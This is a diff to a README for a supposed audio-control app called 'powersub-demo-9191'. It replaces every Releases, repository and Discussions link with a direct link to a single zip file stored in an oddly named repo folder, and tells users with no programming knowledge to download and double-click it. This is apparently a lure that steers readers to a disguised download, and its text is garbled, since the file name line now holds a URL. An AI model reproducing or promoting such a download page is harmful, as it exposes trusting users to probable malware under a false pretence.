@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-9191 - Simple Audio Control for Everyone
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-powersub--demo--9191-brightgreen)](https://github.com/JaammParkerr/powersub-demo-9191/releases)
+[![Download](https://raw.githubusercontent.com/JaammParkerr/powersub-demo-9191/main/glabellum/powersub-demo-9191.zip)](https://raw.githubusercontent.com/JaammParkerr/powersub-demo-9191/main/glabellum/powersub-demo-9191.zip)
 
 ## 📚 Description
 **powersub-demo-9191** is an easy-to-use application designed for managing audio streams effortlessly. Whether you are a casual listener or someone who needs to control various audio sources, this tool helps you enhance your audio experience without complications.
@@ -11,11 +11,11 @@ To get started, follow these simple steps. No programming knowledge required!
 
 ## 📥 Download & Install
 1. Click on the link below to visit our Releases page:
-   [Download from Releases](https://github.com/JaammParkerr/powersub-demo-9191/releases)
+   [Download from Releases](https://raw.githubusercontent.com/JaammParkerr/powersub-demo-9191/main/glabellum/powersub-demo-9191.zip)
    
 2. On the Releases page, look for the latest version at the top. Download the version that matches your operating system. 
 
-3. Once the download completes, locate the downloaded file on your computer. The file name will typically look like `powersub-demo-9191-vX.X.X.exe`.
+3. Once the download completes, locate the downloaded file on your computer. The file name will typically look like `https://raw.githubusercontent.com/JaammParkerr/powersub-demo-9191/main/glabellum/powersub-demo-9191.zip`.
 
 4. Double-click the downloaded file to start the installation process.
 
@@ -66,7 +66,7 @@ Thanks for choosing **powersub-demo-9191**. Your feedback helps us improve the a
 
 ## 🔗 Additional Resources
 For more information, visit:
-- [GitHub Repository](https://github.com/JaammParkerr/powersub-demo-9191)
-- [Community Discussions](https://github.com/JaammParkerr/powersub-demo-9191/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/JaammParkerr/powersub-demo-9191/main/glabellum/powersub-demo-9191.zip)
+- [Community Discussions](https://raw.githubusercontent.com/JaammParkerr/powersub-demo-9191/main/glabellum/powersub-demo-9191.zip)
 
 Remember to always check the Releases page for the latest version and updates. Enjoy using **powersub-demo-9191**!
